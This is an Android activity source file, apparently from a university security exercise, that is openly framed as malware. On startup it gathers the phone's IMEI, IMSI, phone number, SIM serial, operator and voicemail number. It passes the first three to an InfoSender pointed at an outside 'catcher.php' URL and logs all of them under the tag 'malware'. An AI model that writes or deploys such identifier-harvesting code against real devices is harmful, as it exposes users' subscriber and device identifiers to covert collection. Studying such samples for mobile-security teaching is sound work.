package uvigo.teleco.deny.seguridad15;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;


public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        InfoSender sender = new InfoSender("http://www.myweb.com/catcher.php", PhoneInfo.getMyIMEI(this), PhoneInfo.getMyIMSI(this), PhoneInfo.getPhoneNumber(this)); //creo el infosender
        sender.writeToFile();

        TextView tv = (TextView) findViewById(R.id.textView2); //cambio el IMEI por pantalla
        tv.setText(PhoneInfo.getMyIMEI(this));

        tv = (TextView) findViewById(R.id.textView8);
        tv.setText(PhoneInfo.getMyIMSI(this));

        tv = (TextView) findViewById(R.id.textView9);
        tv.setText(PhoneInfo.getPhoneNumber(this));

        tv = (TextView) findViewById(R.id.textView10);
        tv.setText(PhoneInfo.getMySIMSerial(this));

        tv = (TextView) findViewById(R.id.textView11);
        tv.setText(PhoneInfo.getMyNetworkOperator(this));

        Log.d("malware", "Mi numero es " + PhoneInfo.getPhoneNumber(this));
        Log.d("malware", "IMEI " + PhoneInfo.getMyIMEI(this));
        Log.d("malware", "IMSI " + PhoneInfo.getMyIMSI(this));
        Log.d("malware", "Network operator " + PhoneInfo.getMyNetworkOperator(this));
        Log.d("malware", "SIM-Serial " + PhoneInfo.getMySIMSerial(this));
        Log.d("malware", "Voice number " + PhoneInfo.getMyVoiceMailNumberI(this));
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
